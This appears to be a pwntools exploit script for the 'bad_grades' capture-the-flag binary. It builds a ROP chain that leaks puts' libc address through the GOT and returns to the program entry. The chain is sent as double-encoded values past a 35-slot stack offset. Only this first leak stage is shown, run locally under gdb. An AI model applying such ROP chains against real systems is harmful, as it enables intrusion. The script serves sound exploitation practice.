#!/usr/bin/env python3

from pwn import *
from sys import argv
import struct

prog = ELF("bad_grades_patched")
libc = ELF("libc.so.6")

RET_OFFSET = 35
ENTRY_P = 0x400710

if __name__ == "__main__":
    if len(argv) < 2:
        print("Usage: writup.py IP:PORT")
        exit(1)
    context.binary = prog
    IP, PORT = argv[1].split(':')

    rop = ROP(prog.path)
    rop.puts(prog.got['puts'])
    rop.call(ENTRY_P)
    print(rop.dump())
    payload = bytes(rop)
    pay_sz = len(payload) / 8
    with process(prog.path) as run:
        run.sendlineafter(b'> ', b'2')
        run.sendlineafter(b': ', bytes(str(RET_OFFSET + pay_sz), 'utf-8'))
        for _ in range(RET_OFFSET):
            run.sendlineafter(b': ', b'.')
        gdb.attach(run)
        for i in range(0, len(payload), 8):
            run.sendlineafter(b': ', bytes(str(struct.unpack('d', payload[i:i+8])[0]), 'utf-8'))
        run.interactive()
